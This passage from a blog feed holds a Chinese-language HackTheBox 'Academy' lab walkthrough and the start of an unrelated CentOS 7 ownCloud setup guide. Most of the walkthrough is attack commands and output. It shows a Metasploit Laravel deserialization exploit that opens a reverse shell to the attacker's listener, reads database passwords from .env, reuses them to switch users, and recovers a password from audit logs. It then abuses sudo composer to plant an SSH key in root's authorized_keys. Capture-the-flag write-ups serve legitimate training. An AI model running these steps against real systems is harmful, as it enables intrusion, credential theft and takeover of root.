class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/http/laravel_token_unserialize_exec):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting                               Required  Description</span><br><span class="line">   ----       ---------------                               --------  -----------</span><br><span class="line">   APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file</span><br><span class="line">   Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS     academy.htb                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT      80                                            yes       The target port (TCP)</span><br><span class="line">   SSL        false                                         no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI  /                                             yes       Path to target webapp</span><br><span class="line">   VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host</span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.17.216     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(unix/http/laravel_token_unserialize_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.17.216:4444 </span><br><span class="line">[*] Command shell session 1 opened (10.10.17.216:4444 -&gt; 10.10.10.215:39152) at 2020-12-09 03:07:26 -0500</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">pwd</span><br><span class="line">/var/www/html/htb-academy-dev-01/public</span><br><span class="line">ls</span><br><span class="line">css</span><br><span class="line">favicon.ico</span><br><span class="line">index.php</span><br><span class="line">js</span><br><span class="line">robots.txt</span><br><span class="line">web.config</span><br></pre></td></tr></table></figure><h3 id="6-升级交互shell"><a href="#6-升级交互shell" class="headerlink" title="6.升级交互shell"></a>6.升级交互shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ </span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ ls</span><br><span class="line">ls</span><br><span class="line">css  favicon.ico  index.php  js  robots.txt  web.config</span><br><span class="line">www-data@academy:/var/www/html/htb-academy-dev-01/public$ cd ../../</span><br><span class="line">cd ../../</span><br></pre></td></tr></table></figure><h3 id="7-手动爬虫得到了一个口令mySup3rP4s5w0rd"><a href="#7-手动爬虫得到了一个口令mySup3rP4s5w0rd" class="headerlink" title="7.手动爬虫得到了一个口令mySup3rP4s5w0rd!!"></a>7.手动爬虫得到了一个口令<code>mySup3rP4s5w0rd!!</code></h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">www-data@academy:/var/www$ pwd</span><br><span class="line">pwd</span><br><span class="line">/var/www/html</span><br><span class="line">www-data@academy:/var/www/html$ ls</span><br><span class="line">ls</span><br><span class="line">academy  htb-academy-dev-01  index.php</span><br><span class="line">www-data@academy:/var/www/html$ cd academy</span><br><span class="line">cd academy</span><br><span class="line">www-data@academy:/var/www/html/academy$ ls</span><br><span class="line">ls</span><br><span class="line">app        composer.json  database      public     routes      tests</span><br><span class="line">artisan    composer.lock  package.json  readme.md  server.php  vendor</span><br><span class="line">bootstrap  config         phpunit.xml   resources  storage     webpack.mix.js</span><br><span class="line">www-data@academy:/var/www/html/academy$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 280</span><br><span class="line">drwxr-xr-x 12 www-data www-data   4096 Aug 13 12:42 .</span><br><span class="line">drwxr-xr-x  4 root     root       4096 Aug 13 12:36 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data    706 Aug 13 12:42 .env</span><br><span class="line">-rw-r--r--  1 www-data www-data    651 Feb  7  2018 .env.example</span><br><span class="line">-rw-r--r--  1 www-data www-data    111 Feb  7  2018 .gitattributes</span><br><span class="line">-rw-r--r--  1 www-data www-data    155 Feb  7  2018 .gitignore</span><br><span class="line">drwxr-xr-x  6 www-data www-data   4096 Feb  7  2018 app</span><br><span class="line">-rwxr-xr-x  1 www-data www-data   1686 Feb  7  2018 artisan</span><br><span class="line">drwxr-xr-x  3 www-data www-data   4096 Feb  7  2018 bootstrap</span><br><span class="line">-rw-r--r--  1 www-data www-data   1512 Feb  7  2018 composer.json</span><br><span class="line">-rw-r--r--  1 www-data www-data 191621 Aug  9 11:57 composer.lock</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 config</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 database</span><br><span class="line">-rw-r--r--  1 www-data www-data   1150 Feb  7  2018 package.json</span><br><span class="line">-rw-r--r--  1 www-data www-data   1040 Feb  7  2018 phpunit.xml</span><br><span class="line">drwxr-xr-x  4 www-data www-data   4096 Nov  9 10:13 public</span><br><span class="line">-rw-r--r--  1 www-data www-data   3622 Feb  7  2018 readme.md</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 resources</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  7  2018 routes</span><br><span class="line">-rw-r--r--  1 www-data www-data    563 Feb  7  2018 server.php</span><br><span class="line">drwxr-xr-x  5 www-data www-data   4096 Feb  7  2018 storage</span><br><span class="line">drwxr-xr-x  4 www-data www-data   4096 Feb  7  2018 tests</span><br><span class="line">drwxr-xr-x 38 www-data www-data   4096 Aug  9 11:57 vendor</span><br><span class="line">-rw-r--r--  1 www-data www-data    549 Feb  7  2018 webpack.mix.js</span><br><span class="line">www-data@academy:/var/www/html/academy$ cat .env</span><br><span class="line">cat .env</span><br><span class="line">APP_NAME=Laravel</span><br><span class="line">APP_ENV=local</span><br><span class="line">APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=</span><br><span class="line">APP_DEBUG=false</span><br><span class="line">APP_URL=http://localhost</span><br><span class="line"></span><br><span class="line">LOG_CHANNEL=stack</span><br><span class="line"></span><br><span class="line">DB_CONNECTION=mysql</span><br><span class="line">DB_HOST=127.0.0.1</span><br><span class="line">DB_PORT=3306</span><br><span class="line">DB_DATABASE=academy</span><br><span class="line">DB_USERNAME=dev</span><br><span class="line">DB_PASSWORD=mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line">BROADCAST_DRIVER=log</span><br><span class="line">CACHE_DRIVER=file</span><br><span class="line">SESSION_DRIVER=file</span><br><span class="line">SESSION_LIFETIME=120</span><br><span class="line">QUEUE_DRIVER=sync</span><br><span class="line"></span><br><span class="line">REDIS_HOST=127.0.0.1</span><br><span class="line">REDIS_PASSWORD=null</span><br><span class="line">REDIS_PORT=6379</span><br><span class="line"></span><br><span class="line">MAIL_DRIVER=smtp</span><br><span class="line">MAIL_HOST=smtp.mailtrap.io</span><br><span class="line">MAIL_PORT=2525</span><br><span class="line">MAIL_USERNAME=null</span><br><span class="line">MAIL_PASSWORD=null</span><br><span class="line">MAIL_ENCRYPTION=null</span><br><span class="line"></span><br><span class="line">PUSHER_APP_ID=</span><br><span class="line">PUSHER_APP_KEY=</span><br><span class="line">PUSHER_APP_SECRET=</span><br><span class="line">PUSHER_APP_CLUSTER=mt1</span><br><span class="line"></span><br><span class="line">MIX_PUSHER_APP_KEY=&quot;$&#123;PUSHER_APP_KEY&#125;&quot;</span><br><span class="line">MIX_PUSHER_APP_CLUSTER=&quot;$&#123;PUSHER_APP_CLUSTER&#125;&quot;</span><br></pre></td></tr></table></figure><h3 id="8-经过尝试发现cry0l1t3可以登入"><a href="#8-经过尝试发现cry0l1t3可以登入" class="headerlink" title="8.经过尝试发现cry0l1t3可以登入"></a>8.经过尝试发现<code>cry0l1t3</code>可以登入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">www-data@academy:/var/www/html/academy$ cd /home</span><br><span class="line">cd /home</span><br><span class="line">www-data@academy:/home$ ls</span><br><span class="line">ls</span><br><span class="line">21y4d  ch4p  cry0l1t3  egre55  g0blin  mrb3n</span><br><span class="line">www-data@academy:/home$ su cry0l1t3</span><br><span class="line">su cry0l1t3</span><br><span class="line">Password: mySup3rP4s5w0rd!!</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">/bin/bash</span><br><span class="line">cry0l1t3@academy:/home$ </span><br><span class="line"></span><br><span class="line">cry0l1t3@academy:/home$ cd ~</span><br><span class="line">cd ~</span><br><span class="line">cry0l1t3@academy:~$ ls</span><br><span class="line">ls</span><br><span class="line">user.txt</span><br><span class="line">cry0l1t3@academy:~$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">***************************</span><br><span class="line">cry0l1t3@academy:~$ </span><br></pre></td></tr></table></figure><h2 id="0x09-提权"><a href="#0x09-提权" class="headerlink" title="0x09.提权"></a>0x09.提权</h2><h3 id="1-尝试sudo-l进行提权-霸特没有"><a href="#1-尝试sudo-l进行提权-霸特没有" class="headerlink" title="1.尝试sudo -l进行提权 ,霸特没有"></a>1.尝试sudo -l进行提权 ,霸特没有</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:~$ sudo -l</span><br><span class="line">[sudo] password for cry0l1t3: </span><br><span class="line">Sorry, user cry0l1t3 may not run sudo on academy.</span><br><span class="line">cry0l1t3@academy:~$</span><br></pre></td></tr></table></figure><h3 id="2-对SElinux的日志进行审计"><a href="#2-对SElinux的日志进行审计" class="headerlink" title="2.对SElinux的日志进行审计"></a>2.对SElinux的日志进行审计</h3><p><strong><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmdlbnRvby5vcmcvd2lraS9TRUxpbnV4L1R1dG9yaWFscy9XaGVyZV90b19maW5kX1NFTGludXhfcGVybWlzc2lvbl9kZW5pYWxfZGV0YWlscyM6fjp0ZXh0PVNFTGludXglMjBsb2dnaW5nLC1UaGUlMjBtb3N0JTIwaW1wb3J0YW50JnRleHQ9VGhlJTIwZGVmYXVsdCUyMGxvY2F0aW9uJTIwd2hlcmUlMjB5b3UsJTJGdmFyJTJGbG9nJTJGYXVkaXQu">参考文献<i class="fa fa-external-link-alt"></i></span></strong></p><p><code>可以看到有一个用户进行过su</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:/var/log/audit$ cat * | grep &#x27;comm=&quot;su&quot;&#x27;</span><br><span class="line">type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A</span><br><span class="line">cry0l1t3@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><p><code>解码hex</code></p><blockquote><p>密文：6D7262336E5F41634064336D79210A</p><p>原文：mrb3n_Ac@d3my!</p></blockquote><p><code>根据密码可以推测为mrb3n的密码</code></p><h3 id="3-mrb3n登入"><a href="#3-mrb3n登入" class="headerlink" title="3.mrb3n登入"></a>3.mrb3n登入</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cry0l1t3@academy:/var/log/audit$ su mrb3n</span><br><span class="line">Password: </span><br><span class="line"><span class="meta">$</span><span class="bash"> /bin/bash</span></span><br><span class="line">mrb3n@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><p><code>sudo -l提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:/var/log/audit$ sudo -l</span><br><span class="line">[sudo] password for mrb3n:  </span><br><span class="line">Matching Defaults entries for mrb3n on academy:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User mrb3n may run the following commands on academy:</span><br><span class="line">    (ALL) /usr/bin/composer</span><br><span class="line">mrb3n@academy:/var/log/audit$</span><br></pre></td></tr></table></figure><h3 id="4-composer提权"><a href="#4-composer提权" class="headerlink" title="4.composer提权"></a>4.composer提权</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvY29tcG9zZXIv">参考<i class="fa fa-external-link-alt"></i></span></p><p><code>直接进行利用霸特失败了🙃</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:/var/log/audit$ TF=$(mktemp -d)</span><br><span class="line">mrb3n@academy:/var/log/audit$ echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;&#125;&#125;&#x27; &gt;$TF/composer.json</span><br><span class="line">mrb3n@academy:/var/log/audit$ composer --working-dir=$TF run-script x</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;mysqli.so&#x27; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;pdo_mysql.so&#x27; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> whoami</span></span><br><span class="line">mrb3n</span><br><span class="line"><span class="meta">$</span></span><br></pre></td></tr></table></figure><p><code>更换思路，利用ssh公钥进行提权</code></p><blockquote><p>首先使用ssh-keygen生成公钥与私钥</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# ssh-keygen </span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/root/.ssh/id_rsa): </span><br><span class="line">Enter passphrase (empty for no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved in /root/.ssh/id_rsa</span><br><span class="line">Your public key has been saved in /root/.ssh/id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:FKBkE5JZ5qaTiSzGFeu24nBc+9uHrMC4EI1Q6/gOXnc root@JIYE</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+---[RSA 3072]----+</span><br><span class="line">|  o=B....        |</span><br><span class="line">| .oBoo   .       |</span><br><span class="line">|. .o+   .        |</span><br><span class="line">|+*o=   .         |</span><br><span class="line">|*+Bo.   S        |</span><br><span class="line">|o+.=..           |</span><br><span class="line">|+.=o+. E .       |</span><br><span class="line">|+=o..o..o .      |</span><br><span class="line">| oo   +o..       |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">root@JIYE:~# cd .ssh/</span><br><span class="line">root@JIYE:~/.ssh# ls</span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">.pub为公钥</span><br><span class="line">root@JIYE:~/.ssh# cat id_rsa.pub </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc= root@JIYE</span><br></pre></td></tr></table></figure><p><code>依次编写</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mrb3n@academy:~$ TF=$(mktemp -d)</span><br><span class="line">mrb3n@academy:~$ vim $TF/composer.json</span><br><span class="line">&#123;&quot;scripts&quot;:&#123;&quot;SSH&quot;:&quot;echo &#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc=&#x27; &gt;&gt; /root/.ssh/authorized_keys&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">mrb3n@academy:~$ sudo composer --working-dir=$TF run-script SSH</span><br><span class="line">[sudo] password for mrb3n: </span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;mysqli.so&#x27; (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">PHP Warning:  PHP Startup: Unable to load dynamic library &#x27;pdo_mysql.so&#x27; (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0</span><br><span class="line">Do not run Composer as root/super user! See https://getcomposer.org/root for details</span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIuoa+nxwrqqxtdN5zqWblCzN6U6ltR0eZXI+tnPHt2Dx/6ms2bEqSmAV66ETVyjXQKe2fHzNWdhjj4Y48M4eQY+iSR/IxqfxxLysspB0hzylreY+/ScKwvA7LcxoIUR8D5YZq5kGkGR50sO2m16l7kb2X7A9FO6SHTRPbGKlnFI7kypQCoYmgLX7czaci3Ol0pVpYAhFEiNZIt43uU8uwvGELQnj5j9pcPrJU7yDqA/Xm11PUe9x6wrUKmW3pwhiHLT/ONJm8OzBiGvIaAxEK/DvVarrt+DjrlXAugZw87aip+SlBJSpQDWPxk8rAwvCLx1lVvFRekPIvByaRwHHNYypenZHKJi8UCWwEKM004uw4gEuG6VKciPd/eCnrx5Xrufrg2IW9foB9JAFKUICN/be73uJe8DbGn0hLRN+Yr0rE7CDw+ZPqAMp4bKrf9FicUS8fS1eUmAMjIAAN6j6zbI2ftU5EaoJ27CW2evknUcSbgO7fx6hxwt0dliCpXZc=&#x27;</span> &gt;&gt; /root/.ssh/authorized_keys</span></span><br><span class="line">mrb3n@academy:~$</span><br></pre></td></tr></table></figure><p><code>ssh进行连接</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/.ssh# ssh -i id_rsa root@10.10.10.215</span><br><span class="line">kex_exchange_identification: read: Connection reset by peer</span><br><span class="line">Connection reset by 10.10.10.215 port 22</span><br><span class="line">root@JIYE:~/.ssh# ssh -i id_rsa root@10.10.10.215</span><br><span class="line">Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-52-generic x86_64)</span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">  System information as of Wed 09 Dec 2020 11:36:12 AM UTC</span><br><span class="line">  System load:             0.0</span><br><span class="line">  Usage of /:              44.4% of 15.68GB</span><br><span class="line">  Memory usage:            21%</span><br><span class="line">  Swap usage:              0%</span><br><span class="line">  Processes:               178</span><br><span class="line">  Users logged in:         1</span><br><span class="line">  IPv4 address for ens160: 10.10.10.215</span><br><span class="line">  IPv6 address for ens160: dead:beef::250:56ff:feb9:c8a</span><br><span class="line"> * Introducing self-healing high availability clustering for MicroK8s!</span><br><span class="line">   Super simple, hardened and opinionated Kubernetes for production.</span><br><span class="line"></span><br><span class="line">     https://microk8s.io/high-availability</span><br><span class="line">0 updates can be installed immediately.</span><br><span class="line">0 of these updates are security updates.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line">Last login: Mon Nov  9 10:11:49 2020</span><br><span class="line">root@academy:~# ls</span><br><span class="line">academy.txt  root.txt  snap</span><br><span class="line">root@academy:~# cat root.txt </span><br><span class="line">********************</span><br><span class="line">root@academy:~#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-简述&quot;&gt;&lt;a href=&quot;#0x00-简述&quot; class=&quot;headerlink&quot; title=&quot;0x00.简述&quot;&gt;&lt;/a&gt;0x00.简述&lt;/h2&gt;&lt;img src=&quot;/2020/12/09/HTB-academy/image-20201209140730144.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>Centos7搭建own私有网盘</title>
    <link href="https://lunamoore.github.io/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/"/>
    <id>https://lunamoore.github.io/2020/11/25/Centos7%E6%90%AD%E5%BB%BAown%E7%A7%81%E6%9C%89%E7%BD%91%E7%9B%98/</id>
    <published>2020-11-25T06:02:46.000Z</published>
    <updated>2020-11-25T07:46:43.802Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-安装apache"><a href="#1-安装apache" class="headerlink" title="1.安装apache"></a>1.安装apache</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install httpd -y</span><br><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure><h2 id="2-安装配置PHP"><a href="#2-安装配置PHP" class="headerlink" title="2.安装配置PHP"></a>2.安装配置PHP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release -y</span><br><span class="line"></span><br><span class="line">yum install -y http://rpms.remirepo.net/enterprise/remi-release-7.rpm yum-utils</span><br><span class="line"></span><br><span class="line">yum-config-manager --enable remi-php72</span><br><span class="line"></span><br><span class="line">yum install -y php php-mbstring php-gd php-mcrypt php-pear php-pspell php-pdo php-xml php-mysqlnd php-process php-pecl-zip php-xml php-intl php-zip php-zlib</span><br><span class="line"></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="3-安装并配置Mariadb"><a href="#3-安装并配置Mariadb" class="headerlink" 